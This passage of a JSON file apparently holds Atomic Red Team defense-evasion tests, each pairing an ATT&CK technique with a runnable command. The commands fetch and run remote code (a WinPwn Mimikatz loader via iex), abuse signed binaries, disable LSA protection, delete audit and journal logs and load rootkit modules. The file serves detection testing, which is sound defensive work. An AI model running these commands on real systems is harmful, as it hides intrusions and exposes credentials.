         "description": "Launch PowerShell with the \"-WindowStyle Hidden\" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.\nUpon execution a hidden PowerShell window will launch calc.exe\n",
         "command": "Start-Process powershell.exe -WindowStyle hidden calc.exe"
      }
   ],
   "T1218.004": [
      {
         "technique_id": "T1218.004",
         "technique_name": "Signed Binary Proxy Execution: InstallUtil",
         "tactic": "defense-evasion",
         "description": "Executes the installer assembly class constructor. Upon execution, version information will be displayed the .NET framework install utility.\n",
         "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
      },
      {
         "technique_id": "T1218.004",
         "technique_name": "Signed Binary Proxy Execution: InstallUtil",
         "tactic": "defense-evasion",
         "description": "Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.\nIf no output is displayed the test executed successfuly.\n",
         "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'CheckIfInstallable'; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
      },
      {
         "technique_id": "T1218.004",
         "technique_name": "Signed Binary Proxy Execution: InstallUtil",
         "tactic": "defense-evasion",
         "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
         "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Uninstall_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
      },
      {
         "technique_id": "T1218.004",
         "technique_name": "Signed Binary Proxy Execution: InstallUtil",
         "tactic": "defense-evasion",
         "description": "Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, \"Running a transacted installation.\"\nwill be displayed, along with other information about the opperation. \"The transacted install has completed.\" will be displayed upon completion.\n",
         "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"; $InstallerAssemblyFileName = 'readme.txt'; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"readme.txt\"; $ExpectedOutput = 'Constructor_'; Set-Location \"$Env:windir\\System32\\Tasks\"; Copy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine;     InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
      },
      {
         "technique_id": "T1218.004",
         "technique_name": "Signed Binary Proxy Execution: InstallUtil",
         "tactic": "defense-evasion",
         "description": "Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test\nexecuted successfuly.\n",
         "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'InstallHelper';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
      },
      {
         "technique_id": "T1218.004",
         "technique_name": "Signed Binary Proxy Execution: InstallUtil",
         "tactic": "defense-evasion",
         "description": "Executes the Uninstall Method. Upon execution, help information will be displayed for InstallUtil.\n",
         "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_HelpText_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
      },
      {
         "technique_id": "T1218.004",
         "technique_name": "Signed Binary Proxy Execution: InstallUtil",
         "tactic": "defense-evasion",
         "description": "Executes the Install Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
         "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Install_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
      },
      {
         "technique_id": "T1218.004",
         "technique_name": "Signed Binary Proxy Execution: InstallUtil",
         "tactic": "defense-evasion",
         "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
         "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Uninstall_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
      }
   ],
   "T1221": [
      {
         "technique_id": "T1221",
         "technique_name": "Template Injection",
         "tactic": "defense-evasion",
         "description": "Open a .docx file that loads a remote .dotm macro enabled template from https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm \nExecutes the code specified within the .dotm template.\nRequires download of WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  \nDefault docs file opens Calculator.exe when test sucessfully executed, while AV turned off.\n",
         "command": "start \"01b633_Calculator.docx\""
      }
   ],
   "T1562.008": [
      {
         "technique_id": "T1562.008",
         "technique_name": "Impair Defenses: Disable Cloud Logs",
         "tactic": "defense-evasion",
         "description": "You can use the Exchange Management Shell to enable or disable mailbox audit logging for a mailbox.\nUnified or Admin Audit logs are disabled via the Exchange Powershell cmdline.\nhttps://github.com/Azure/Azure-Sentinel/blob/master/Detections/OfficeActivity/exchange_auditlogdisabled.yaml\n",
         "command": "$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False"
      },
      {
         "technique_id": "T1562.008",
         "technique_name": "Impair Defenses: Disable Cloud Logs",
         "tactic": "defense-evasion",
         "description": "This Atomic will attempt to remove AWS VPC Flow Logs configuration. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/\n",
         "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.vpc-remove-flow-logs; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force"
      },
      {
         "technique_id": "T1562.008",
         "technique_name": "Impair Defenses: Disable Cloud Logs",
         "tactic": "defense-evasion",
         "description": "Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/\n",
         "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.cloudtrail-event-selectors; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force"
      },
      {
         "technique_id": "T1562.008",
         "technique_name": "Impair Defenses: Disable Cloud Logs",
         "tactic": "defense-evasion",
         "description": "GCP provides 4 types of Cloud Audit Logs: Admin Activity, Data Access, System Events, and Policy Denied.\nAn adversary may attempt to delete logs in order to hide their activity. However, Admin Activity, System Events, and Policy Deny events logs cannot be deleted. \n\nThis Atomic attempts to delete the Activity Event log. An event is generated under the method name of `google.logging.v2.LoggingServiceV2.DeleteLog` with a Serverity of `ERROR`.\n",
         "command": "gcloud config set project atomic-project-1; gcloud logging logs delete projects/atomic-project-1/logs/cloudaudit.googleapis.com%2Factivity --quiet"
      },
      {
         "technique_id": "T1562.008",
         "technique_name": "Impair Defenses: Disable Cloud Logs",
         "tactic": "defense-evasion",
         "description": "This Atomic test will use the Stratus Red Team will first setup a CloudTrail logging into an S3 bucket and will then make an API call to update the lifecycle rule on that S3 bucket with an expiration date of 1 day. This will essentially delete all the logs after one day. Adversaries often do this actiivity to evade detection. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/\n",
         "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force"
      },
      {
         "technique_id": "T1562.008",
         "technique_name": "Impair Defenses: Disable Cloud Logs",
         "tactic": "defense-evasion",
         "description": "Identifies an Event Hub deletion in Azure.\nAn Event Hub is an event processing service that ingests and processes large volumes of events and data.\nAn adversary may delete an Event Hub in an attempt to evade detection.\nhttps://docs.microsoft.com/en-us/azure/event-hubs/event-hubs-about.\n",
         "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd; Connect-AzureAD -Credential $creds; Remove-AzEventHub -ResourceGroupName"
      },
      {
         "technique_id": "T1562.008",
         "technique_name": "Impair Defenses: Disable Cloud Logs",
         "tactic": "defense-evasion",
         "description": "Use Exchange Management Shell to Mailbox auditing to bypass. It will prevent any mailbox audit logging entries being generated for the target e-mail box.\nhttps://learn.microsoft.com/en-us/powershell/module/exchange/set-mailboxauditbypassassociation?view=exchange-ps\n",
         "command": "$secure_pwd = \"o365_password_test\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"o365_user_test\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Set-MailboxAuditBypassAssociation -Identity \"o365_email_test\" -AuditBypassEnabled $true"
      },
      {
         "technique_id": "T1562.008",
         "technique_name": "Impair Defenses: Disable Cloud Logs",
         "tactic": "defense-evasion",
         "description": "Creates a new cloudTrail in AWS, Upon successful creation it will Update,Stop and Delete the cloudTrail\n",
         "command": "if [ -f \"$PathToAtomicsFolder/T1562.008/src/T1562.008-1/terraform.tfstate\" ]; then : ; else cd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-1/\"; terraform init; terraform apply -auto-approve; fi;  ;  aws cloudtrail update-trail --name redatomictesttrail --s3-bucket-name redatomic-test  --is-multi-region-trail --region us-east-1; aws cloudtrail stop-logging --name redatomictesttrail --region us-east-1; aws cloudtrail delete-trail --name redatomictesttrail --region us-east-1"
      }
   ],
   "T1070": [
      {
         "technique_id": "T1070",
         "technique_name": "Indicator Removal on Host",
         "tactic": "defense-evasion",
         "description": "Finds a file by user name (if Disk Quotas are enabled), queries allocated ranges for a file, sets a file's short name, sets a file's valid data length, sets zero data for a file, or creates a new file. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-file\n- https://tria.ge/230601-x8x6bsgb24/behavioral2\n",
         "command": "if (-not (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\")) { New-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\" -Force } ; echo \"1234567890\" > \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\"; fsutil  file setZeroData offset=0 length=10 \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\""
      },
      {
         "technique_id": "T1070",
         "technique_name": "Indicator Removal on Host",
         "tactic": "defense-evasion",
         "description": "Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n",
         "command": "fsutil usn deletejournal /D C:"
      }
   ],
   "T1562": [
      {
         "technique_id": "T1562",
         "technique_name": "Impair Defenses",
         "tactic": "defense-evasion",
         "description": "The atomic test disables the journal logging by searching and replacing the \"Storage\" parameter to \"none\" within the journald.conf file, thus any new journal entries will only be temporarily available in memory and not written to disk\n",
         "command": "sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf"
      },
      {
         "technique_id": "T1562",
         "technique_name": "Impair Defenses",
         "tactic": "defense-evasion",
         "description": "The atomic test disables the journal logging using built-in systemctl utility\n",
         "command": "sudo systemctl stop systemd-journald"
      },
      {
         "technique_id": "T1562",
         "technique_name": "Impair Defenses",
         "tactic": "defense-evasion",
         "description": "The following Atomic adds a registry entry to disable LSA Protection.\n\nThe LSA controls and manages user rights information, password hashes and other important bits of information in memory. Attacker tools, such as mimikatz, rely on accessing this content to scrape password hashes or clear-text passwords. Enabling LSA Protection configures Windows to control the information stored in memory in a more secure fashion - specifically, to prevent non-protected processes from accessing that data.\nUpon successful execution, the registry will be modified and RunAsPPL will be set to 0, disabling Lsass protection.\nhttps://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#how-to-disable-lsa-protection\nhttps://blog.netwrix.com/2022/01/11/understanding-lsa-protection/\nhttps://thedfirreport.com/2022/03/21/phosphorus-automates-initial-access-using-proxyshell/  \n",
         "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f"
      }
   ],
   "T1036.005": [
      {
         "technique_id": "T1036.005",
         "technique_name": "Masquerading: Match Legitimate Name or Location",
         "tactic": "defense-evasion",
         "description": "Launch an executable that attempts to masquerade as a legitimate executable.\n",
         "command": "Add-Type -TypeDefinition @'; public class Test {;     public static void Main(string[] args) {;         System.Console.WriteLine(\"tweet, tweet\");     }; }; '@ -OutputAssembly \"$Env:windir\\Temp\\svchost.exe\"; Start-Process -FilePath \"$Env:windir\\Temp\\svchost.exe\""
      },
      {
         "technique_id": "T1036.005",
         "technique_name": "Masquerading: Match Legitimate Name or Location",
         "tactic": "defense-evasion",
         "description": "Create and execute a process from a directory masquerading as the current parent directory (`...` instead of normal `..`)\n",
         "command": "mkdir $HOME/...; cp $(which sh) $HOME/...; $HOME/.../sh -c \"echo Hello from the Atomic Red Team test T1036.005#1\""
      }
   ],
   "T1036.006": [
      {
         "technique_id": "T1036.006",
         "technique_name": "Masquerading: Space after Filename",
         "tactic": "defense-evasion",
         "description": "Space after filename.\n",
         "command": "mkdir -p /tmp/atomic-test-T1036.006; cd /tmp/atomic-test-T1036.006; mkdir -p 'testdirwithspaceend '; /usr/bin/echo -e \"%d\\na\\n#!/usr/bin/perl\\nprint \\\"running T1035.006 with space after filename to masquerade init\\\\n\\\";\\nqx/cp \\/usr\\/bin\\/perl 'init  '/;\\nqx/'.\\/init  ' -e 'sleep 5'/;\\n.\\nwq\\n\" | ed 'testdirwithspaceend /init ' >/dev/null; chmod +x 'testdirwithspaceend /init '; './testdirwithspaceend /init '"
      }
   ],
   "T1216.001": [
      {
         "technique_id": "T1216.001",
         "technique_name": "Signed Script Proxy Execution: Pubprn",
         "tactic": "defense-evasion",
         "description": "Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.\n",
         "command": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:#{remote_payload}\""
      }
   ],
   "T1014": [
      {
         "technique_id": "T1014",
         "technique_name": "Rootkit",
         "tactic": "defense-evasion",
         "description": "Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).\n",
         "command": "echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload; /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \"process hidden\""
      },
      {
         "technique_id": "T1014",
         "technique_name": "Rootkit",
         "tactic": "defense-evasion",
         "description": "Loadable Kernel Module based Rootkit\n",
         "command": "sudo modprobe T1014"
      },
      {
         "technique_id": "T1014",
         "technique_name": "Rootkit",
         "tactic": "defense-evasion",
         "description": "Loadable Kernel Module based Rootkit\n",
         "command": "sudo insmod PathToAtomicsFolder/T1014/bin/T1014.ko"
      },
      {
         "technique_id": "T1014",
         "technique_name": "Rootkit",
         "tactic": "defense-evasion",
         "description": "Loads Diamorphine kernel module, which hides itself and a processes.\n",
         "command": "sudo modprobe diamorphine; ping -c 10 localhost >/dev/null & TARGETPID=\"$!\"; ps $TARGETPID; kill -31 $TARGETPID; ps $TARGETPID || echo \"process ${TARGETPID} hidden\""
      }
   ],
   "T1027.001": [
      {
         "technique_id": "T1027.001",
         "technique_name": "Obfuscated Files or Information: Binary Padding",
         "tactic": "defense-evasion",
         "description": "Uses truncate to add a byte to the binary to change the hash.\n\nUpon successful execution, truncate will modify `/tmp/evil-binary`, therefore the expected hash will change.\n",
         "command": "truncate -s +1 /tmp/evil-binary"
      },
      {
         "technique_id": "T1027.001",
         "technique_name": "Obfuscated Files or Information: Binary Padding",
         "tactic": "defense-evasion",
         "description": "Uses dd to add a zero byte, high-quality random data, and low-quality random data to the binary to change the hash.\n\nUpon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.\n",
         "command": "dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary; dd if=/dev/random bs=1 count=1 >> /tmp/evil-binary; dd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary"
      }
   ],
   "T1620": [
      {
         "technique_id": "T1620",
         "technique_name": "Reflective Code Loading",
         "tactic": "defense-evasion",
         "description": "Reflectively load Mimik@tz into memory technique via function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); mimiload -consoleoutput -noninteractive"
      }
   ],
   "T1564.006": [
      {
         "technique_id": "T1564.006",
         "technique_name": "Run Virtual Instance",
         "tactic": "defense-evasion",
         "description": "Create a simple Hyper-V VM (Windows native hypervisor) and start up the machine\nCleanup command stops and deletes the newly created VM\nhttps://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v\nhttps://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
